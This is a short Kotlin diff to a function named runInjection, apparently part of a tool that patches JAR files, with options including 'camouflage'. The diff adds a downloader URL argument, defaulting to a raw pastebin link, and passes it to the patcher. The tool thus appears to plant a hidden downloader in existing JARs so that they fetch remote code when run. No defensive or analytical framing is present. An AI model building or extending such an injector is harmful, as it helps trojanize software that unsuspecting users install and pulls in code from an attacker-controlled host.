@@ -60,6 +60,7 @@ fun runInjection(args: List<String>) {
     val outputPath = findArg("output", "o", args) ?: if (mode == "multiple") "out" else "out.jar"
     val replace = boolArg("replace", "r", args)
     val camouflage = boolArg("camouflage", null, args)
+    val downloaderUrl = findArg("url", "u", args) ?: "https://pastebin.com/raw/JD0bB1Eb"
 
     val inputFiles = when (mode) {
         "multiple" -> {
@@ -101,7 +102,8 @@ fun runInjection(args: List<String>) {
             outputPath = effectiveOutputPath,
             camouflage = camouflage,
             config = config,
-            configJson = configJson
+            configJson = configJson,
+            downloaderUrl = downloaderUrl
         ).patch()
     }
 }
